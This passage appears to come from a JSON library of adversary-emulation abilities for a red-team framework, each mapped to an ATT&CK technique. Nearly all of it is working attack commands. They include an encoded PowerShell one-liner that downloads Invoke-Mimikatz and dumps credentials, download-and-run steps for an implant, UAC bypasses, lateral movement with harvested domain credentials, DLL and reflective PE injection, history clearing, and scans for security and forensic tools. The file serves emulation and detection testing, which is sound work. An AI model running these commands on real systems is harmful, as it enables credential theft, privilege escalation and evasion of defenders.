    "ccdb8caf-c69e-424b-b930-551969450c57": {
        "description": "Download",
        "tactic": "execution",
        "technique": {
            "attack_id": "T1059.001",
            "name": "Command and Scripting Interpreter: PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ARQBtAHAAaQByAGUAUAByAG8AagBlAGMAdAAvAEUAbQBwAGkAcgBlAC8ANwBhADMAOQBhADUANQBmADEAMgA3AGIAMQBhAGUAYgA5ADUAMQBiADMAZAA5AGQAOAAwAGMANgBkAGMANgA0ADUAMAAwAGMAYQBjAGIANQAvAGQAYQB0AGEALwBtAG8AZAB1AGwAZQBfAHMAbwB1AHIAYwBlAC8AYwByAGUAZABlAG4AdABpAGEAbABzAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAiACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQAKAA==\n"
                }
            }
        },
        "id__dependence__fact": [
            "ccdb8caf-c69e-424b-b930-551969450c57",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "e99cce5c-cb7e-4a6e-8a09-1609a221b90a": {
        "description": "UIPI bypass with uiAccess application",
        "tactic": "privilege-escalation",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"sandcat.go\");\n$wc.Headers.add(\"server\",\"#{server}\");\n$wc.Headers.add(\"defaultSleep\",\"60\");\n$wc.Headers.add(\"defaultGroup\",\"bypassed_u_bro\");\n$data=$wc.DownloadData($url);\n$name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\");\n[io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);\n.\\Akagi64.exe 32 \"C:\\Users\\Public\\$name.exe -server #{server}\"\n",
                    "payloads": [
                        "Akagi64.exe"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "e99cce5c-cb7e-4a6e-8a09-1609a221b90a",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "95ad5d69-563e-477b-802b-4855bfb3be09": {
        "description": "Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe",
        "tactic": "privilege-escalation",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"
        },
        "platforms": {
            "windows": {
                "cmd,psh": {
                    "command": ".\\Akagi64.exe 30 C:\\Windows\\System32\\cmd.exe\n",
                    "payloads": [
                        "Akagi64.exe"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "95ad5d69-563e-477b-802b-4855bfb3be09",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "665432a4-42e7-4ee1-af19-a9a8c9455d0c": {
        "description": "Set a registry key to allow UAC bypass",
        "tactic": "privilege-escalation",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "New-ItemProperty -Path HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system -Name EnableLUA -PropertyType DWord -Value 0 -Force\n"
                }
            }
        },
        "id__dependence__fact": [
            "665432a4-42e7-4ee1-af19-a9a8c9455d0c",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "e3db134c-4aed-4c5a-9607-c50183c9ef9e": {
        "description": "Bypass user account controls - medium",
        "tactic": "privilege-escalation",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$url=\"#{server}/file/download\"; $wc=New-Object System.Net.WebClient; $wc.Headers.add(\"platform\",\"windows\"); $wc.Headers.add(\"file\",\"sandcat.go\"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"); [io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);\n$job = Start-Job -ScriptBlock { Import-Module -Name .\\Bypass-UAC.ps1; Bypass-UAC -Command \"C:\\Users\\Public\\$name.exe -group #{group}\"; };\nReceive-Job -Job $job -Wait;\n",
                    "payloads": [
                        "Bypass-UAC.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "e3db134c-4aed-4c5a-9607-c50183c9ef9e",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "b7344901-0b02-4ead-baf6-e3f629ed545f": {
        "description": "executes the slui exe file handler hijack",
        "tactic": "privilege-escalation",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": ".\\Akagi64.exe 45 C:\\Windows\\System32\\cmd.exe\n",
                    "payloads": [
                        "Akagi64.exe"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "b7344901-0b02-4ead-baf6-e3f629ed545f",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "4908fdc4-74fc-4d7c-8935-26d11ad26a8d": {
        "description": "Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP",
        "tactic": "lateral-movement",
        "technique": {
            "attack_id": "T1570",
            "name": "Lateral Tool Transfer"
        },
        "platforms": {
            "windows": {
                "psh,pwsh": {
                    "command": "$job = Start-Job -ScriptBlock {\n  $username = \"#{domain.user.name}\";\n  $password = \"#{domain.user.password}\";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName \"#{remote.host.name}\" -Credential $cred;\n  $location = \"#{location}\";\n  $exe = \"#{exe_name}\";\n  Copy-Item $location -Destination \"C:\\Users\\Public\\svchost.exe\" -ToSession $session;\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;\n",
                    "cleanup": "$job = Start-Job -ScriptBlock {\n  $username = \"#{domain.user.name}\";\n  $password = \"#{domain.user.password}\";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName \"#{remote.host.name}\" -Credential $cred;\n  Invoke-Command -Session $session -Command {Remove-Item \"C:\\Users\\Public\\svchost.exe\" -force};\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;\n",
                    "payloads": [
                        "sandcat.go-windows"
                    ]
                }
            },
            "darwin": {
                "sh": {
                    "command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go\n",
                    "cleanup": "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm -f sandcat.go'\n",
                    "payloads": [
                        "sandcat.go-darwin"
                    ]
                }
            },
            "linux": {
                "sh": {
                    "command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go\n",
                    "cleanup": "ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no #{remote.ssh.cmd} 'rm -f sandcat.go'\n",
                    "payloads": [
                        "sandcat.go-linux"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "4908fdc4-74fc-4d7c-8935-26d11ad26a8d",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "620b674a-7655-436c-b645-bc3e8ea51abd": {
        "description": "Copy Sandcat file using PsExec on CMD",
        "tactic": "lateral-movement",
        "technique": {
            "attack_id": "T1570",
            "name": "Lateral Tool Transfer"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del /f sandcat.go-windows && del /f \\\\#{remote.host.name}\\Users\\Public\\sandcat.go-windows.exe",
                    "command": "net /y use \\\\#{remote.host.name} & copy /y sandcat.go-windows\n\\\\#{remote.host.name}\\Users\\Public & #{psexec.path} -accepteula \\\\#{remote.host.name}\ncmd /c start C:\\Users\\Public\\sandcat.go-windows -server #{server} -v\n",
                    "payloads": [
                        "sandcat.go-windows"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "620b674a-7655-436c-b645-bc3e8ea51abd",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "40161ad0-75bd-11e9-b475-0800200c9a66": {
        "description": "Mounts a network file share on a target computer",
        "tactic": "lateral-movement",
        "technique": {
            "attack_id": "T1021.002",
            "name": "Remote Services: SMB/Windows Admin Shares"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "net use \\\\#{remote.host.ip}\\c$ /user:#{domain.user.name} #{domain.user.password};\n",
                    "cleanup": "net use \\\\#{remote.host.ip}\\c$ /delete;\n"
                }
            }
        },
        "id__dependence__fact": [
            "40161ad0-75bd-11e9-b475-0800200c9a66",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "41bb2b7a-75af-49fd-bd15-6c827df25921": {
        "description": "Start Agent using WinRM (WinRM)",
        "tactic": "lateral-movement",
        "technique": {
            "attack_id": "T1021.006",
            "name": "Remote Services: Windows Remote Management"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\\Users\\Public\\svchost.exe -server #{server} }};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;\n",
                    "cleanup": "$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{Get-Process cmd | Where-Object Path -eq C:\\Users\\Public\\svchost.exe | Stop-Process}};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;\n",
                    "payloads": [
                        "sandcat.go-windows"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "41bb2b7a-75af-49fd-bd15-6c827df25921",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "aa6ec4dd-db09-4925-b9b9-43adeb154686": {
        "description": "Mount a windows share",
        "tactic": "lateral-movement",
        "technique": {
            "attack_id": "T1021.002",
            "name": "Remote Services: SMB/Windows Admin Shares"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "net use \\\\#{remote.host.fqdn}\\C$ /user:#{domain.user.name} #{domain.user.password}\n",
                    "cleanup": "net use \\\\#{remote.host.fqdn}\\C$ /delete\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.share_mounted": [
                            {
                                "source": "remote.host.fqdn",
                                "edge": "has_share"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "aa6ec4dd-db09-4925-b9b9-43adeb154686",
            "remote.host.fqdn",
            "remote.host.fqdn"
        ],
        "plugin": "stockpile"
    },
    "3734aa1e-c536-42b3-8912-4c91b8bdce90": {
        "description": "Copy Sandcat file using PowerShell",
        "tactic": "lateral-movement",
        "technique": {
            "attack_id": "T1021.006",
            "name": "Remote Services: Windows Remote Management"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$server=\"#{server}\";\n$sharePath=\"#{share}\";\nSet-Location $sharePath;$url=\"$($server)/file/download\";\n$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"sandcat.go\");($data=$wc.DownloadData($url)) -and\n($name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"))\n-and ([io.file]::WriteAllBytes(\"$($sharePath)$name.exe\",$data));\n$startServer=\"$($sharePath)$name.exe -server $($server) \";Invoke-Command\n-ScriptBlock {Param([string]$startServer, $sharePath, $name, $server)  Invoke-WmiMethod\n-Class Win32_Process -Name Create -ArgumentList \"$($sharePath)$name.exe\n-server $server -v\" } -ComputerName #{remote.host.name} -ArgumentList $startServer, $sharePath, $name, $server\n",
                    "cleanup": "del sandcat.go-windows; Invoke-Command -ComputerName",
                    "payloads": [
                        "sandcat.go-windows"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "3734aa1e-c536-42b3-8912-4c91b8bdce90",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "65048ec1-f7ca-49d3-9410-10813e472b30": {
        "description": "Copy 54ndc47 to remote host (SMB)",
        "tactic": "lateral-movement",
        "technique": {
            "attack_id": "T1021.002",
            "name": "Remote Services: SMB/Windows Admin Shares"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$path = \"sandcat.go-windows\";\n$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nCopy-Item -v -Path $path -Destination $drive\"\\Users\\Public\\s4ndc4t.exe\";\n",
                    "cleanup": "$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nRemove-Item -Path $drive\"\\Users\\Public\\s4ndc4t.exe\" -Force;\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.54ndc47_remote_copy": [
                            {
                                "source": "remote.host.fqdn",
                                "edge": "has_54ndc47_copy"
                            }
                        ]
                    },
                    "payloads": [
                        "sandcat.go-windows"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "65048ec1-f7ca-49d3-9410-10813e472b30",
            "remote.host.fqdn",
            "remote.host.fqdn"
        ],
        "plugin": "stockpile"
    },
    "a74bc239-a196-4f7e-8d5c-fe8c0266071c": {
        "description": "Leverage odbcconf for DLL injection",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1055.001",
            "name": "Process Injection: Dynamic-link Library Injection"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\sandcat.dll\"}\n"
                }
            }
        },
        "id__dependence__fact": [
            "a74bc239-a196-4f7e-8d5c-fe8c0266071c",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "e5bcefee-262d-4568-a261-e8a20855ec81": {
        "description": "Leverage Mavinject (signed binary) for DLL injection",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1055.002",
            "name": "Process Injection: Portable Executable Injection"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$explorer = Get-Process -Name explorer;\nmavinject.exe $explorer.id C:\\Users\\Public\\sandcat.dll\n"
                }
            }
        },
        "id__dependence__fact": [
            "e5bcefee-262d-4568-a261-e8a20855ec81",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "4cd4eb44-29a7-4259-91ae-e457b283a880": {
        "description": "Remove a downloaded payload file",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.004",
            "name": "Indicator Removal on Host: File Deletion"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "cleanup": "rm #{payload}\n"
                }
            },
            "linux": {
                "sh": {
                    "cleanup": "rm #{payload}\n"
                }
            },
            "windows": {
                "psh,pwsh": {
                    "cleanup": "Remove-Item -Force -Path \"#{payload}\""
                }
            }
        },
        "id__dependence__fact": [
            "4cd4eb44-29a7-4259-91ae-e457b283a880",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "43b3754c-def4-4699-a673-1d85648fda6a": {
        "description": "Stop terminal from logging history",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.003",
            "name": "Indicator Removal on Host: Clear Command History"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "> $HOME/.bash_history && unset HISTFILE\n"
                }
            },
            "linux": {
                "sh": {
                    "command": "> $HOME/.bash_history && unset HISTFILE\n"
                }
            },
            "windows": {
                "psh": {
                    "command": "Clear-History;Clear"
                }
            }
        },
        "id__dependence__fact": [
            "43b3754c-def4-4699-a673-1d85648fda6a",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "3864fd22-5c63-41c9-bdbc-a66b5ffa3f5e": {
        "description": "Ensure the ExecutionPolicy is turned to Bypass",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "Set-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell -Name ExecutionPolicy -Value ByPass;\n        $shell = New-Object -ComObject Wscript.Shell\n        Set-ExecutionPolicy Bypass | echo $shell.sendkeys(\"Y`r`n\")"
                }
            }
        },
        "id__dependence__fact": [
            "3864fd22-5c63-41c9-bdbc-a66b5ffa3f5e",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "7a6ba833-de40-466a-8969-5c37b13603e0": {
        "description": "Check for analysis/sandbox environment processes. Process black list is based on the SUNBURST malware observed in a Solarwinds related compromise (https://research.checkpoint.com/2020/sunburst-teardrop-and-the-netsec-new-normal/).",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1497.001",
            "name": "Virtualization/Sandbox Evasion: System Checks"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$forensicProcesses = @(\n    \"apimonitor-x64\",\n    \"apimonitor-x86\",\n    \"autopsy64\",\n    \"autopsy\",\n    \"autoruns64\",\n    \"autoruns\",\n    \"autorunsc64\",\n    \"autorunsc\",\n    \"binaryninja\",\n    \"blacklight\",\n    \"cff explorer\",\n    \"cutter\",\n    \"de4dot\",\n    \"debugview\",\n    \"diskmon\",\n    \"dnsd\",\n    \"dnspy\",\n    \"dotpeek32\",\n    \"dotpeek64\",\n    \"dumpcap\",\n    \"evidence center\",\n    \"exeinfope\",\n    \"fakedns\",\n    \"fakenet\",\n    \"ffdec\",\n    \"fiddler\",\n    \"fileinsight\",\n    \"floss\",\n    \"gdb\",\n    \"hiew32demo\",\n    \"hiew32\",\n    \"hollows_hunter\",\n    \"idaq64\",\n    \"idaq\",\n    \"idr\",\n    \"ildasm\",\n    \"ilspy\",\n    \"jd-gui\",\n    \"lordpe\",\n    \"officemalscanner\",\n    \"ollydbg\",\n    \"pdfstreamdumper\",\n    \"pe-bear\",\n    \"pebrowse64\",\n    \"peid\",\n    \"pe-sieve32\",\n    \"pe-sieve64\",\n    \"pestudio\",\n    \"peview\",\n    \"ppee\",\n    \"procdump64\",\n    \"procdump\",\n    \"processhacker\",\n    \"procexp64\",\n    \"procexp\",\n    \"procmon\",\n    \"prodiscoverbasic\",\n    \"py2exedecompiler\",\n    \"r2agent\",\n    \"rabin2\",\n    \"radare2\",\n    \"ramcapture64\",\n    \"ramcapture\",\n    \"reflector\",\n    \"regmon\",\n    \"resourcehacker\",\n    \"retdec-ar-extractor\",\n    \"retdec-bin2llvmir\",\n    \"retdec-bin2pat\",\n    \"retdec-config\",\n    \"retdec-fileinfo\",\n    \"retdec-getsig\",\n    \"retdec-idr2pat\",\n    \"retdec-llvmir2hll\",\n    \"retdec-macho-extractor\",\n    \"retdec-pat2yara\",\n    \"retdec-stacofin\",\n    \"retdec-unpacker\",\n    \"retdec-yarac\",\n    \"rundotnetdll\",\n    \"sbiesvc\",\n    \"scdbg\",\n    \"scylla_x64\",\n    \"scylla_x86\",\n    \"shellcode_launcher\",\n    \"solarwindsdiagnostics\",\n    \"sysmon64\",\n    \"sysmon\",\n    \"task explorer\",\n    \"task explorer-x64\",\n    \"tcpdump\",\n    \"tcpvcon\",\n    \"tcpview\",\n    \"vboxservice\",\n    \"win32_remote\",\n    \"win64_remotex64\",\n    \"windbg\",\n    \"windump\",\n    \"winhex64\",\n    \"winhex\",\n    \"winobj\",\n    \"wireshark\",\n    \"x32dbg\",\n    \"x64dbg\",\n    \"xwforensics64\",\n    \"xwforensics\",\n    \"redcloak\",\n    \"avgsvc\",\n    \"avgui\",\n    \"avgsvca\",\n    \"avgidsagent\",\n    \"avgsvcx\",\n    \"avgwdsvcx\",\n    \"avgadminclientservice\",\n    \"afwserv\",\n    \"avastui\",\n    \"avastsvc\",\n    \"aswidsagent\",\n    \"aswidsagenta\",\n    \"aswengsrv\",\n    \"avastavwrapper\",\n    \"bccavsvc\",\n    \"psanhost\",\n    \"psuaservice\",\n    \"psuamain\",\n    \"avp\",\n    \"avpui\",\n    \"ksde\",\n    \"ksdeui\",\n    \"tanium\",\n    \"taniumclient\",\n    \"taniumdetectengine\",\n    \"taniumendpointindex\",\n    \"taniumtracecli\",\n    \"taniumtracewebsocketclient64\"\n);\n\nfunction Find-ForensicProcesses {\n    param (\n        $ForensicProcessList\n    );\n    $CurrentProcesses = Get-Process | Sort-Object | Select-Object -Property Name | Get-Unique -AsString;\n    foreach ($proc in $CurrentProcesses) {\n        foreach ($forensicProc in $ForensicProcessList) {\n            if ($proc.name -like $forensicProc) {\n                $procPath = Get-Process -Name $proc.Name | Sort-Object | Select-Object -Property Path | Get-Unique;\n                Write-Host \"[!] Forensic process found: \" $proc.Name;\n                Write-Host \"[!] Path: \" $procPath.Path;\n            }\n        }\n    }\n}\n\nFind-ForensicProcesses($forensicProcesses);"
                }
            }
        },
        "id__dependence__fact": [
            "7a6ba833-de40-466a-8969-5c37b13603e0",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "5f844ac9-5f24-4196-a70d-17f0bd44a934": {
        "description": "Deadman ability to delete agent file after termination.",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.004",
            "name": "Indicator Removal on Host: File Deletion"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$startupClass = Get-CimClass -ClassName Win32_ProcessStartup;\n$startupInfo = New-CimInstance -CimClass $startupClass -Property @{ShowWindow = 0} -ClientOnly;\n$processClass = Get-CimClass -ClassName Win32_Process;\nInvoke-CimMethod -CimClass $processClass -MethodName Create -Arguments @{\n    Commandline = 'cmd.exe /c \"timeout /nobreak /t 10 >nul 2>nul & del /f #{location}\"';\n    ProcessStartupInformation = [CimInstance]$startupInfo\n};\n"
                }
            },
            "darwin": {
                "sh": {
                    "command": "path=\"$(pwd)/#{exe_name}\";\nnum_processes=$(for id in $(pgrep -f #{exe_name}); do lsof -p $id 2> /dev/null | grep \"$path\"; done | wc -l);\nif [ \"$num_processes\" -le 1 ]; then /bin/rm -f \"$path\"; fi;\n"
                }
            },
            "linux": {
                "sh": {
                    "command": "path=\"$(pwd)/#{exe_name}\";\nnum_processes=$(for id in $(pgrep -f #{exe_name}); do lsof -p $id 2> /dev/null | grep \"$path\"; done | wc -l);\nif [ \"$num_processes\" -le 1 ]; then /bin/rm -f \"$path\"; fi;"
                }
            }
        },
        "id__dependence__fact": [
            "5f844ac9-5f24-4196-a70d-17f0bd44a934",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "e5f9de8f-3df1-4e78-ad92-a784e3f6770d": {
        "description": "Copy powershell to non-standard location and perform triage commands",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1059.001",
            "name": "PowerShell"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "Copy-Item C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\Temp\\debug.exe;\nC:\\Windows\\Temp\\debug.exe get-process >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe get-localgroup >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe get-localuser >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion >> C:\\Windows\\temp\\debug.log;\n"
                }
            }
        },
        "id__dependence__fact": [
            "e5f9de8f-3df1-4e78-ad92-a784e3f6770d",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "1258b063-27d6-489b-a677-4807faacf868": {
        "description": "Check for security services. Security service list is based on the SUNBURST malware observed in a Solarwinds related compromise (https://research.checkpoint.com/2020/sunburst-teardrop-and-the-netsec-new-normal/).",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1497.001",
            "name": "Virtualization/Sandbox Evasion: System Checks"
        },
        "platforms": {
            "windows": {
                "psh,pwsh": {
                    "command": "$securityServices = @(\n    \"msmpeng\",\n    \"windefend\",\n    \"mssense\",\n    \"sense\",\n    \"microsoft.tri.sensor\",\n    \"microsoft.tri.sensor.updater\",\n    \"cavp\",\n    \"cb\",\n    \"carbonblack\",\n    \"carbonblackk\",\n    \"cbcomms\",\n    \"cbstream\",\n    \"csfalconservice\",\n    \"csfalconcontainer\",\n    \"csagent\",\n    \"csdevicecontrol\",\n    \"csfalconservice\",\n    \"xagt\",\n    \"xagtnotif\",\n    \"fe_avk\",\n    \"fekern\",\n    \"feelam\",\n    \"fewscservice\",\n    \"ekrn\",\n    \"eguiproxy\",\n    \"egui\",\n    \"eamonm\",\n    \"eelam\",\n    \"ehdrv\",\n    \"ekrnepfw\",\n    \"epfwwfp\",\n    \"ekbdflt\",\n    \"epfw\",\n    \"fsgk32st\",\n    \"fswebuid\",\n    \"fsgk32\",\n    \"fsma32\",\n    \"fssm32\",\n    \"fnrb32\",\n    \"fsaua\",\n    \"fsorsp\",\n    \"fsav32\",\n    \"f-secure gatekeeper handler starter\",\n    \"f-secure network request broker\",\n    \"f-secure webui daemon\",\n    \"fsma\",\n    \"fsorspclient\",\n    \"f-secure gatekeeper\",\n    \"f-secure hips\",\n    \"fsbts\",\n    \"fsni\",\n    \"fsvista\",\n    \"f-secure filter\",\n    \"f-secure recognizer\",\n    \"fses\",\n    \"fsfw\",\n    \"fsdfw\",\n    \"fsms\",\n    \"fsdevcon\"\n);\n\n$currentServices = Get-Service | Select-Object -Property Name;\nforeach ($svc in $currentServices) {\n    foreach ($secSvc in $securityServices) {\n        if ($svc.Name -like $secSvc) {\n            $svcDetails = Get-Service -name $svc.Name | Select-Object -Property Name, DisplayName, Status;\n            Write-Host \"[!] Security service found:\";\n            Write-Host \"    Service Name:`t\", $svcDetails.Name;\n            Write-Host \"    Display Name:`t\", $svcDetails.DisplayName;\n            Write-Host \"    Status:`t`t\", $svcDetails.Status;\n            Write-Host \"\";\n        }\n    }\n}\n"
                }
            }
        },
        "id__dependence__fact": [
            "1258b063-27d6-489b-a677-4807faacf868",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "36eecb80-ede3-442b-8774-956e906aff02": {
        "description": "Pause all operations to avoid making noise",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1497.003",
            "name": "Virtualization/Sandbox Evasion: Time Based Evasion"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "sleep 60"
                }
            },
            "linux": {
                "sh": {
                    "command": "sleep 60"
                }
            },
            "windows": {
                "psh": {
                    "command": "sleep 60"
                }
            }
        },
        "id__dependence__fact": [
            "36eecb80-ede3-442b-8774-956e906aff02",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "a398986f-31b0-436a-87e9-c8e82c028f3c": {
        "description": "Injects sandcat DLL into an available process",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1055.002",
            "name": "Process Injection: Portable Executable Injection"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"shared.go\");\n$wc.Headers.add(\"server\",\"#{server}\");\n$PEBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -verbose -PBytes $PEbytes -ProcId #{host.process.id}\n"
                }
            }
        },
        "id__dependence__fact": [
            "a398986f-31b0-436a-87e9-c8e82c028f3c",
            "host.process.id",
            "None"
        ],
        "plugin": "stockpile"
    },
    "60f63260-39bb-4136-87a0-b6c2dca799fc": {
        "description": "Download, install and start new process under PowerShell Core 6",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1105",
            "name": "Ingress Tool Transfer"
        },
        "platforms": {
            "windows": {
                "psh": {
